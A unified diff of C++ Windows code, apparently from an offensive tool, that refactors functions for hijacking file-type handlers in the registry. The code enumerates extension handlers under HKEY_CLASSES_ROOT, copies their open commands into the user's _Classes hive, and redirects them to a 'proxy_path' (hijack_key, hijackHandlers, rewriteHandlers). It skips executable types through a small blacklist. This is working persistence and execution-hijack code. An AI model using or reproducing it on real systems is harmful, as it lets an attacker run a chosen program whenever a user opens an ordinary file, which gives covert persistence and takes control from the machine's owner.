@@ -100,42 +100,196 @@ BOOL hijack_key(std::string subKey, std::string proxy_path)
     return TRUE;
 }
 
-bool copy_key(HKEY srcBaseKey, HKEY dstBaseKey, std::string subKey)
+bool key_exist(HKEY baseKey, std::string subKey)
 {
-    bool is_success = FALSE;
+    HKEY res = NULL;
+    bool exist = false;
+    RegOpenKeyA(baseKey, subKey.c_str(), &res);
+    if (res != NULL) {
+        exist = true;
+        RegCloseKey(res);
+    }
+    return exist;
+}
 
-    size_t changed = 0;
-    printf("+%s\n", subKey.c_str());
-
-    //
+bool read_key(HKEY srcBaseKey, std::string subKey, OUT BYTE *path_buffer, OUT DWORD &val_len, OUT DWORD &type)
+{
     HKEY commandKey = NULL;
     if (RegOpenKeyExA(srcBaseKey, subKey.c_str(), 0, KEY_READ, &commandKey) != ERROR_SUCCESS) {
         return false;
     }
-    BYTE path_buffer[MAX_KEY_LENGTH];
-    DWORD val_len = MAX_KEY_LENGTH;
-    DWORD type;//RRF_RT_ANY
+
     RegGetValueA(commandKey, NULL, 0, RRF_RT_ANY, &type, path_buffer, &val_len);
     if (val_len == 0) {
         RegCloseKey(commandKey);
-        printf("Reading source failed\n");
         return false;
     }
     RegCloseKey(commandKey);
-
-    HKEY hDstKey = NULL;
-    if (RegCreateKey(dstBaseKey, subKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
-        return is_success;
-    }
-    if (RegSetValueExA(hDstKey, NULL, 0, type, path_buffer, val_len) == ERROR_SUCCESS) {
-        is_success = true;
-    }
-
-    RegCloseKey(hDstKey);
-    return is_success;
+    return true;
 }
 
-size_t hijackExtensions(std::string proxy_path)
+bool write_key(HKEY dstBaseKey, std::string subKey, BYTE *path_buffer, DWORD &val_len, DWORD &type)
+{
+    HKEY hDstKey = NULL;
+    if (RegCreateKey(dstBaseKey, subKey.c_str(), &hDstKey) != ERROR_SUCCESS) {
+        return false;
+    }
+    if (RegSetValueExA(hDstKey, NULL, 0, type, path_buffer, val_len) == ERROR_SUCCESS) {
+        RegCloseKey(hDstKey);
+        return true;
+    }
+    RegCloseKey(hDstKey);
+    return false;
+}
+
+bool copy_key(HKEY srcBaseKey, HKEY dstBaseKey, std::string subKey)
+{
+    BYTE path_buffer[MAX_KEY_LENGTH];
+    DWORD val_len = MAX_KEY_LENGTH;
+    DWORD type;//RRF_RT_ANY
+    
+    size_t changed = 0;
+    printf("+%s\n", subKey.c_str());
+    if (!read_key(srcBaseKey, subKey, path_buffer, val_len, type)) {
+        return false;
+    }
+    //
+    if (!write_key(dstBaseKey, subKey, path_buffer, val_len, type)) {
+        return false;
+    }
+    return true;
+}
+
+std::string getLocalClasses()
+{
+    HKEY hTestKey = NULL;
+    if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
+        return 0;
+    }
+
+    std::vector<std::string> subkeys = get_subkeys(hTestKey);
+    RegCloseKey(hTestKey);
+    hTestKey = NULL;
+
+    std::vector<std::string>::iterator itr;
+    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
+        if (itr->find("_Classes") == std::string::npos) {
+            continue;
+        }
+        HKEY innerKey1;
+        if (RegOpenKeyExA(HKEY_USERS, itr->c_str(), 0, KEY_READ | KEY_WRITE, &innerKey1) != ERROR_SUCCESS) {
+            continue;
+        }
+        RegCloseKey(innerKey1);
+        return *itr;
+    }
+    return "";
+}
+
+std::set<std::string> getGlobalCommands()
+{
+    std::set<std::string> handlersSet;
+
+    size_t keys = 0;
+    HKEY hTestKey = NULL;
+    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
+        return handlersSet;
+    }
+    std::vector<std::string> subkeys = get_subkeys(hTestKey);
+    RegCloseKey(hTestKey);
+
+    std::vector<std::string>::iterator itr;
+    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
+        if (itr->at(0) != '.') {
+            continue;
+        }
+        //extension found!
+        HKEY innerKey1;
+        if (RegOpenKeyExA(HKEY_CLASSES_ROOT, itr->c_str(), 0, KEY_READ, &innerKey1) != ERROR_SUCCESS) {
+            continue;
+        }
+        std::string ext = *itr;
+        std::string handlerName = getValueString(HKEY_CLASSES_ROOT, ext);
+
+        if (handlerName.length() == 0) continue;
+
+       std::string path = getValueString(HKEY_CLASSES_ROOT, handlerName + "\\shell\\open\\command");
+       if (path.length() == 0) continue;
+       handlersSet.insert(handlerName);
+    }
+    return handlersSet;
+}
+
+bool is_blacklisted(std::string handlerName)
+{
+    //you can write your own blacklist here
+    if (handlerName == "exefile") return true;
+    if (handlerName == "batfile") return true;
+    if (handlerName == "cmdfile") return true;
+    if (handlerName == "comfile") return true;
+    if (handlerName == "scrfile") return true;
+    return false;
+}
+
+bool is_path_blacklisted(std::string path_buffer)
+{
+    //you can write your own blacklist here
+    if (path_buffer.find("%1") == std::string::npos) {
+        //path has no param
+        return true;
+    }
+    return false;
+}
+
+size_t rewriteHandlers(std::string &local, std::set<std::string> &handlersSets)
+{
+    HKEY localClassesKey = NULL;
+    if (RegOpenKeyExA(HKEY_USERS, local.c_str(), 0, KEY_READ | KEY_WRITE, &localClassesKey) != ERROR_SUCCESS) {
+        return 0;
+    }
+    size_t added = 0;
+    std::set<std::string>::iterator hItr;
+    for (hItr = handlersSets.begin(); hItr != handlersSets.end(); hItr++) {
+        std::string handlerName = *hItr;
+        if (is_blacklisted(handlerName)) {
+            continue;
+        }
+
+        if (!key_exist(localClassesKey, handlerName.c_str()) ) {
+
+            BYTE path_buffer[MAX_KEY_LENGTH];
+            DWORD val_len = MAX_KEY_LENGTH;
+            DWORD type;//RRF_RT_ANY
+    
+            std::string commandKey = handlerName + "\\shell\\open\\command";
+            printf("+%s\n", commandKey.c_str());
+            if (!read_key(HKEY_CLASSES_ROOT, commandKey, path_buffer, val_len, type)) {
+                continue;
+            }
+            if (type != REG_SZ) {
+                continue;
+            }
+            if (is_path_blacklisted((char*) path_buffer)) {
+                printf("[BLACKLISTED] %s\n", path_buffer);
+                continue;
+            }
+            //
+            if (!write_key(localClassesKey, commandKey, path_buffer, val_len, type)) {
+                continue;
+            }
+            printf("[+] %s\n", path_buffer);
+            added++;
+
+        } else {
+            printf("Already exist: ");
+            printf("%s\n", handlerName.c_str());
+        }
+    }
+    RegCloseKey(localClassesKey);
+    return added;
+}
+
+size_t hijackHandlers(std::string proxy_path)
 {
     HKEY hTestKey = NULL;
     if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
@@ -175,118 +329,4 @@ size_t hijackExtensions(std::string proxy_path)
     }
     printf("Hijacked keys: %d\n", hijacked);
     return hijacked;
-}
-
-std::string getLocalClasses()
-{
-    HKEY hTestKey = NULL;
-    if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
-        return 0;
-    }
-
-    std::vector<std::string> subkeys = get_subkeys(hTestKey);
-    RegCloseKey(hTestKey);
-    hTestKey = NULL;
-
-    std::vector<std::string>::iterator itr;
-    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
-        if (strstr(itr->c_str(), "_Classes") == NULL) {
-            continue;
-        }
-        HKEY innerKey1;
-        if (RegOpenKeyExA(HKEY_USERS, itr->c_str(), 0, KEY_READ | KEY_WRITE, &innerKey1) != ERROR_SUCCESS) {
-            continue;
-        }
-        RegCloseKey(innerKey1);
-        return *itr;
-    }
-    return "";
-}
-
-bool key_exist(HKEY baseKey, std::string subKey)
-{
-    HKEY res = NULL;
-    bool exist = false;
-    RegOpenKeyA(baseKey, subKey.c_str(), &res);
-    if (res != NULL) {
-        exist = true;
-        RegCloseKey(res);
-    }
-    return exist;
-}
-
-std::set<std::string> getGlobalCommands()
-{
-    std::set<std::string> handlersSet;
-
-    size_t keys = 0;
-    HKEY hTestKey = NULL;
-    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
-        return handlersSet;
-    }
-    std::vector<std::string> subkeys = get_subkeys(hTestKey);
-    RegCloseKey(hTestKey);
-
-    std::vector<std::string>::iterator itr;
-    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {
-        if (itr->at(0) != '.') {
-            continue;
-        }
-        //extension found!
-        HKEY innerKey1;
-        if (RegOpenKeyExA(HKEY_CLASSES_ROOT, itr->c_str(), 0, KEY_READ, &innerKey1) != ERROR_SUCCESS) {
-            continue;
-        }
-        std::string ext = *itr;
-        std::string handlerName = getValueString(HKEY_CLASSES_ROOT, ext);
-
-        if (handlerName.length() == 0) continue;
-
-       std::string path = getValueString(HKEY_CLASSES_ROOT, handlerName + "\\shell\\open\\command");
-       if (path.length() == 0) continue;
-       handlersSet.insert(handlerName);
-    }
-    return handlersSet;
-}
-
-bool rewrite_handler(HKEY localClassesKey, std::string handlerName)
-{
-    return copy_key(HKEY_CLASSES_ROOT, localClassesKey, handlerName + "\\shell\\open\\command");
-}
-
-bool is_blacklisted(std::string handlerName)
-{
-    if (handlerName == "exefile") return true;
-    if (handlerName == "batfile") return true;
-    if (handlerName == "cmdfile") return true;
-    if (handlerName == "comfile") return true;
-    return false;
-}
-
-size_t rewriteExtensions(std::string &local, std::set<std::string> &handlersSets)
-{
-    HKEY localClassesKey = NULL;
-    if (RegOpenKeyExA(HKEY_USERS, local.c_str(), 0, KEY_READ | KEY_WRITE, &localClassesKey) != ERROR_SUCCESS) {
-        return 0;
-    }
-    size_t added = 0;
-    std::set<std::string>::iterator hItr;
-    for (hItr = handlersSets.begin(); hItr != handlersSets.end(); hItr++) {
-        std::string handlerName = *hItr;
-        if (is_blacklisted(handlerName)) {
-            continue;
-        }
-        if (!key_exist(localClassesKey, handlerName.c_str()) ) {
-            if (rewrite_handler(localClassesKey, handlerName)) {
-                added++;
-            } else {
-                printf("Failed\n");
-            }
-        } else {
-            printf("Already exist: ");
-            printf("%s\n", handlerName.c_str());
-        }
-    }
-    RegCloseKey(localClassesKey);
-    return added;
 }
